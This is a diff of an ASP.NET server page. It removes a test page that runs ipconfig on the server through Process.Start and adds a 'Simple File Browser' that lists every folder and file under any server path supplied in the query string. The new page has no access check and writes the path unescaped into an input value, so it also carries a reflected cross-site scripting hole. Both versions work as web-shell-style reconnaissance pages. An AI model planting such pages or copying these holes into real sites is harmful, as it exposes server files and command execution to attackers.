@@ -2,56 +2,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test OS Command Execution</title>
+    <title>Directory Browser</title>
     <style>
         body {
-            font-family: Consolas, monospace;
-            background: #f0f0f0;
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
             padding: 40px;
         }
-        #outputBox {
-            background: #ffffff;
-            color: #000000;
-            width: 100%;
-            height: 400px;
-            padding: 10px;
-            font-size: 14px;
-            border: 1px solid #ccc;
-            white-space: pre;
-            overflow: auto;
+        #container {
+            max-width: 800px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #ccc;
         }
+        h2 { margin-bottom: 10px; }
+        a { text-decoration: none; color: blue; }
+        ul { list-style: none; padding-left: 0; }
+        li { margin-bottom: 5px; }
+        .folder { font-weight: bold; }
+        .file { color: gray; }
+        form { margin-top: 20px; }
+        input[type="text"] { width: 80%; padding: 5px; }
+        button { padding: 5px 10px; }
     </style>
 </head>
 <body>
-    <h2>Test OS Command Output: <code>ipconfig</code></h2>
-    <div id="outputBox">
+    <div id="container">
+        <h2>Simple File Browser</h2>
+
 <%
-    try
+    string root = Server.MapPath("~/"); // fallback default
+    string baseDir = Request.QueryString["path"] ?? root;
+
+    if (!System.IO.Directory.Exists(baseDir))
     {
-        string command = "ipconfig";
-        System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
-        psi.FileName = command;
-        psi.Arguments = "";
-        psi.RedirectStandardOutput = true;
-        psi.RedirectStandardError = true;
-        psi.UseShellExecute = false;
-        psi.CreateNoWindow = true;
-
-        using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
-        {
-            string output = process.StandardOutput.ReadToEnd();
-            string error = process.StandardError.ReadToEnd();
-            process.WaitForExit();
-
-            string fullOutput = output + (string.IsNullOrWhiteSpace(error) ? "" : "\n[ERROR]\n" + error);
-            Response.Write(Server.HtmlEncode(fullOutput));
-        }
+        Response.Write("<p style='color:red;'>Directory not found: " + Server.HtmlEncode(baseDir) + "</p>");
+        baseDir = root;
     }
-    catch (Exception ex)
+
+    Response.Write("<p><strong>Current Directory:</strong> " + Server.HtmlEncode(baseDir) + "</p>");
+%>
+
+        <form method="get">
+            <input type="text" name="path" value="<%= baseDir %>" />
+            <button type="submit">Go</button>
+        </form>
+
+        <h3>Folders</h3>
+        <ul>
+<%
+    foreach (string dir in System.IO.Directory.GetDirectories(baseDir))
     {
-        Response.Write("<span style='color:red'>ERROR:</span><br/>" + Server.HtmlEncode(ex.ToString()));
+        string name = System.IO.Path.GetFileName(dir);
+        string encodedPath = Server.UrlEncode(dir);
+%>
+            <li class="folder">
+                📁 <a href="?path=<%= encodedPath %>"><%= name %></a>
+            </li>
+<%
     }
 %>
+        </ul>
+
+        <h3>Files</h3>
+        <ul>
+<%
+    foreach (string file in System.IO.Directory.GetFiles(baseDir))
+    {
+        string name = System.IO.Path.GetFileName(file);
+%>
+            <li class="file">📄 <%= name %></li>
+<%
+    }
+%>
+        </ul>
     </div>
 </body>
 </html>
